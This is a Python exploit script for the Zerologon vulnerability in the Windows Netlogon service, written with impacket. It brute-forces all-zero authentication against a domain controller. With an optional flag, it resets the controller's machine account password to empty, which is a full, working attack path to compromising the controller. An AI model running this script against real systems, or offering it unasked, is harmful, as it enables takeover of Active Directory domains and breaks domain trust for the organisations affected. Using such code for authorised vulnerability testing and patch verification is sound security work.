#!/usr/bin/env python3

from impacket.dcerpc.v5 import epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import argparse

import hmac, hashlib, struct, sys, socket, time, nrpc
from binascii import hexlify, unhexlify
from subprocess import check_call



# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )

    # It worked!
    assert server_auth['ErrorCode'] == 0
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')

def exploit(rpc_con, ciphertext, dc_handle, dc_ip, target_computer):
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = ciphertext
    authenticator['Timestamp'] = 0
    password = nrpc.NL_TRUST_PASSWORD()
    password['Buffer'] = b'\x00' * 516
    password['Length'] = '\x00' * 4
    if rpc_con:
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = dc_handle + '\x00'
        request['AccountName'] = target_computer + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request['Authenticator'] = authenticator
        request['ComputerName'] = target_computer + '\x00'
        request['ClearNewPassword'] = password
        req = rpc_con.request(request)
        print('Password Set to empty string.')
        return True
    else:
        return False

def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if rpc_con == None:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
    ciphertext = b'\x00' * 8
    if args.exploit:
        exploit(rpc_con, ciphertext, dc_handle, dc_ip, target_computer)

  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Tests whether a domain controller is vulnerable to the Zerologon attack.')
    parser.add_argument('name', metavar='N', type=str, nargs='+', help='Netbios name of the Domain Controller')
    parser.add_argument('ip', metavar='IP', type=str, nargs='+', help='IP address of the DOmain Controller')
    parser.add_argument('-x', '--exploit', action="store_true", help='Exploit the target', required=False)
    args = parser.parse_args()

    #impacket breaks when attempting to give it the variables from argparse, so get from argv
    dc_name = sys.argv[1]
    dc_name = dc_name.rstrip('$')
    dc_ip = sys.argv[2]
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)

